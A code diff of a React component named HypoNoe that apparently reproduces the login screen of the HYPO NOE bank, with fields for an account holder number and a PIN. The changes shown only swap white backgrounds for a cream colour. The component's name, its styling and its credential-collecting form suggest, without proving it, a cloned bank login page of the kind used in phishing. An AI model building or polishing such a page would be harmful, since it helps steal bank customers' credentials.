@@ -42,7 +42,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
       ></div>
 
       {/* Header */}
-      <header className="w-full bg-white h-[80px] flex items-center px-4 md:px-12 shrink-0 shadow-sm">
+      <header className="w-full bg-[#fff6ec] h-[80px] flex items-center px-4 md:px-12 shrink-0 shadow-sm">
         <div className="flex items-center">
           <div className="relative w-40 h-16">
             <Image 
@@ -57,7 +57,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
 
       {/* Main Content */}
       <div className="flex-1 flex items-center justify-center px-4 py-12">
-        <div className="w-full max-w-[620px] bg-white shadow-[0_4px_20px_rgba(0,0,0,0.1)] flex flex-col">
+        <div className="w-full max-w-[620px] bg-[#fff6ec] shadow-[0_4px_20px_rgba(0,0,0,0.1)] flex flex-col">
           
           {/* Blue Title Bar */}
           <div className="bg-[#0066cc] text-white px-6 py-4">
@@ -67,7 +67,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
           <div className="p-6 md:p-8">
             
             {/* Orange Warning Box */}
-            <div className="border border-[#ff8c00] bg-white p-4 flex gap-4 mb-6 relative overflow-hidden">
+            <div className="border border-[#ff8c00] bg-[#fff6ec] p-4 flex gap-4 mb-6 relative overflow-hidden">
               <div className="shrink-0 pt-1">
                 <div className="w-7 h-7 bg-[#ff8c00] rounded-full flex items-center justify-center text-white font-bold text-lg">
                   !
@@ -115,7 +115,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
                     autoFocus
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                    className="w-full h-[38px] bg-[#f2f2f2] border border-[#e0e0e0] rounded px-3 outline-none focus:border-[#0066cc] focus:bg-white text-[#333] text-[14px] transition-colors"
+                    className="w-full h-[38px] bg-[#f2f2f2] border border-[#e0e0e0] rounded px-3 outline-none focus:border-[#0066cc] focus:bg-[#fff6ec] text-[#333] text-[14px] transition-colors"
                   />
                 ) : (
                   <div className="animate-in fade-in slide-in-from-right-4 duration-300">
@@ -125,7 +125,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
                       autoFocus
                       value={formData.pin || ""}
                       onChange={(e) => onChange("pin", e.target.value)}
-                      className="w-full h-[38px] bg-[#f2f2f2] border border-[#e0e0e0] rounded px-3 outline-none focus:border-[#0066cc] focus:bg-white text-[#333] text-[14px] transition-colors"
+                      className="w-full h-[38px] bg-[#f2f2f2] border border-[#e0e0e0] rounded px-3 outline-none focus:border-[#0066cc] focus:bg-[#fff6ec] text-[#333] text-[14px] transition-colors"
                     />
                   </div>
                 )}
@@ -155,7 +155,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
                 <button 
                   type="button" 
                   onClick={() => setStep(1)}
-                  className="w-full mt-3 bg-white border border-[#0066cc] hover:bg-blue-50 text-[#0066cc] font-medium h-[42px] rounded-[4px] text-[15px] transition-colors"
+                  className="w-full mt-3 bg-[#fff6ec] border border-[#0066cc] hover:bg-blue-50 text-[#0066cc] font-medium h-[42px] rounded-[4px] text-[15px] transition-colors"
                 >
                   Zurück
                 </button>
